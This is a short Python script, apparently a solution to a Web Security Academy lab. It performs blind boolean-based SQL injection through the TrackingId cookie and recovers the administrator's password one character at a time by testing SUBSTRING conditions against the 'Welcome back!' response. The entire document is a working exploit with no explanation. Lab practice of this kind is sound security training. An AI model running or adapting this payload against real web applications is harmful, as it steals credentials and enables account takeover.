import requests
import string


url = "https://{your_instans}.web-security-academy.net/"

alphabet = string.ascii_lowercase + "1234567890"

payload = ""
password = ""
num=1

s = requests.Session()

while True:
    for i in alphabet:
        payload = password + i

        track = {
            "TrackingId": f"your_tracker' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, {num} ) = '{payload}'--"  
        }   
        
        print(track)
        r = s.get(url,cookies=track)
        if "Welcome back!" in r.text:
            password = password + i
            print(i, "||", "True")
            num     += 1
        else:
            print("False")
